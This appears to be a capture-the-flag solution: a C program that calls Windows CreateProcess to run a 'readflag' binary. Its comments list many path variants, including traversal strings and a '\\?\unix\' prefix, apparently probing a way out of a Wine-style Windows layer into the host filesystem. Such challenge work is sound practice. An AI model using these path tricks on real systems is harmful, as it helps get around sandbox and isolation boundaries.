#include <stdio.h>
#include <windows.h>

int main(int argc, char *argv[]) {
    // https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // Start the child process.
    if( !CreateProcess(
        // NULL,   // No module name (use command line)
        argc == 2 ? argv[1] :
        // "/readflag",
        // "C:\\readflag",
        // "\\readflag",
        // "/readflag.exe",
        // "C:\\readflag.exe",
        // "\\readflag.exe",
        // "\\\\readflag",
        // "\\\\.\\readflag",
        // "readflag",
        // "Z:\\readflag",
        // "..\\..\\..\\..\\..\\readflag",
        // "../../../../../readflag",
        // "\\\\?\\unix\\dev\\shm\\readflag",
        "\\\\?\\unix\\readflag",

        // argc == 2 ? argv[1] : "/readflag", // Command line
        // argc == 2 ? argv[1] : "/readflag", // Command line
        // argc == 2 ? argv[1] : "C:\\readflag", // Command line
        NULL,

        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    )
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return 1;
    }
    // CreateProcess failed (2).

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles.
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}
